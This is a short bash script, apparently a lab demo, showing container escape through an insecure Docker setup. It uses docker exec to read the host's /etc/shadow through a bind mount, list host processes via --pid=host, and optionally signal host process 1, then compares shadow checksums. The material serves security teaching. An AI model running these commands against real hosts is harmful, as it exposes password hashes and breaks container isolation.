#!/usr/bin/env bash
set -euo pipefail
#CID="dma_secure"
CID="dma_insecure"
echo "== Exploit demo in $CID =="
echo "[1] Read host /etc/shadow via bind mount"
docker exec "$CID" sh -lc 'head -n 5 /host/etc/shadow || echo "[!] Failed"'
echo "[2] See host processes (because --pid=host)"
docker exec "$CID" sh -lc 'ps aux | head -n 10'
echo "[3] (Optional, DANGEROUS) Try to kill a host process (skip in shared hosts!)"
echo "    Example: docker exec $CID sh -lc "kill -0 1 || echo cannot kill""
# na ho≈õcie
echo suma kontrolna shadow na hoscie
sha256sum /etc/shadow | cut -d' ' -f1

# w kontenerze
echo suma kontrolna shadow z dockera
docker exec  "$CID" sh -lc 'sha256sum /host/etc/shadow | cut -d" " -f1'

